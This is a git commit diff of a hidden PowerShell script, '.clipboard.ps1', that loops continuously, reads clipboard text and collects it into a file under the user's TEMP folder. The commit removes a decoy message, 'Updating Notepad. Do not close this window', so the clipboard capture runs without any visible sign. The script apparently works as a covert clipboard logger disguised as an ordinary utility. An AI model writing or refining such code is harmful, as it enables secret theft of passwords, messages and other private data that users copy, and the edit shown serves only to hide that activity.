b4a602c6df2f289faedda641b00d316c2360f611
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2024-12-18 18:43:51 -0300

    Update .clipboard.ps1

--- .clipboard.ps1
+++ .clipboard.ps1
@@ -3,7 +3,6 @@ Add-Type -AssemblyName System.Windows.Forms
 $outputFilePath = "$env:TEMP\Collection\ClipboardContent.txt"
 
 $previousText = ""
-Write-Host "Updating Notepad. Do not close this window"
 while ($true) {
     $currentText = [System.Windows.Forms.Clipboard]::GetText()
     if ($currentText -ne $previousText -and $currentText -ne "") {
